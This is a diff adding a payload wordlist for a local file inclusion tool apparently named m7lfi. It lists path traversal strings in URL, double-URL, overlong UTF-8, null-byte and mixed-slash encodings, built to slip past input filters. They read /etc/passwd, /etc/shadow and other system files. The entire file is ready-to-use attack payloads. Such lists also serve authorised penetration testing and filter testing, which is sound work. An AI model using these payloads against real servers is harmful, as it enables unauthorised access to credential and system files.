@@ -1,0 +1,69 @@
+# m7lfi - Encoding / Obfuscation Payloads
+# Milkyway Intelligence | Sharlix
+
+# URL encoded ../
+..%2fetc%2fpasswd
+..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# Double URL encoded
+..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+
+# Unicode / overlong UTF-8
+..%c0%afetc%c0%afpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# EF BF BD encoding
+..%ef%bc%8fetc%ef%bc%8fpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+# Mixed encoding
+..%2f..%2f..%2fetc/passwd
+..%2F..%2F..%2Fetc/passwd
+..%2f%2e%2e%2fetc%2fpasswd
+..%5c..%5cetc%5cpasswd
+..%5C..%5Cetc%5Cpasswd
+..%255c..%255cetc%255cpasswd
+
+# Hex encoded /
+..%2fetc%2fshadow
+..%2fetc%2fhosts
+..%2fetc%2fgroup
+..%2fetc%2fos-release
+..%2fetc%2fhostname
+
+# Path splitting
+..//etc/passwd
+..\/etc/passwd
+..\\/etc/passwd
+..\/\/etc/passwd
+
+# Dot tricks
+.%2e/etc/passwd
+%2e./etc/passwd
+%2e%2e/etc/passwd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Junk insertion
+../././././etc/passwd
+..%00/etc/passwd
+..%0d/etc/passwd
+..%0a/etc/passwd
+
+# Combined
+%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
